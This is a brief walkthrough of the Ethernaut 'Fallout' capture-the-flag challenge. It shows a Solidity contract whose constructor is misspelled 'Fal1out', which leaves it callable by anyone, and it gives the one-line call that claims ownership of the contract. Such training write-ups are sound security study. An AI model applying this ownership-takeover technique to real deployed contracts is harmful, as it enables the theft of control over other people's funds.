# Fallout

This challenge is just as the [Fallback challenge](https://github.com/wptechprodigy/ethernaut_500nigeriandev/blob/master/fallback/index.md) solved earlier.

Claim the ownership of the contract.

But there's a catch.

```solidity
/* constructor */
function Fal1out() public payable {
  owner = msg.sender;
  allocations[owner] = msg.value;
}
```

The constructor was wrongly named. Instead of _Fallout_, it's named _Fal1out_.

A simple call of the function **as named** is important.

So, the line below's enough to claim the contract:

```solidity
await contract.Fal1out()
```

Meet me, again, for the next challenge: **Coin Flip**
